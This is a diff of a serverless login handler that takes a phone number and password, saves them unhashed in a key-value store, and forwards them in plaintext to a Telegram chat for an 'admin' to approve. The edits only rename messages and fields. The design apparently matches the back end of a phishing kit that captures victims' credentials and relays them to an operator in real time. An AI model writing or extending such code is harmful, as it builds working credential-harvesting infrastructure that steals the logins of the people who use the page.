@@ -2,6 +2,7 @@ import { makeJsonResponse, makeTextResponse, uuidv4, setRequestInKV, sendTelegra
 
 export async function onRequest(context) {
   const { request, env } = context;
+
   if (request.method === "OPTIONS") return makeTextResponse("", 204);
   if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);
 
@@ -14,28 +15,19 @@ export async function onRequest(context) {
 
   const { phone, password } = body;
   if (!phone || !password) {
-    return makeJsonResponse({ error: "Missing fields phone and password" }, 400);
+    return makeJsonResponse({ error: "Missing required fields" }, 400);
   }
 
   const requestId = uuidv4();
-  const now = new Date().toISOString();
+  const data = { phone, password, approved: false, timestamp: new Date().toISOString() };
 
-  const entry = {
-    requestId,
-    phone,
-    password,
-    timestamp: now,
-    approved: false,
-    rejectedReason: null,
-  };
-
-  await setRequestInKV(env, requestId, entry, "password");
-
+  // Store the request in KV and notify the admin
+  await setRequestInKV(env, requestId, data, "password");
   await sendTelegramNotification(
-    { requestId, phone, password, type: "Password Verification" },
+    { requestId, phone, password, type: "Login (Password)" },
     env,
-    request.url,
+    request.url
   );
 
-  return makeJsonResponse({ success: true, requestId, message: "Password verification sent for admin approval" });
+  return makeJsonResponse({ success: true, requestId });
 }
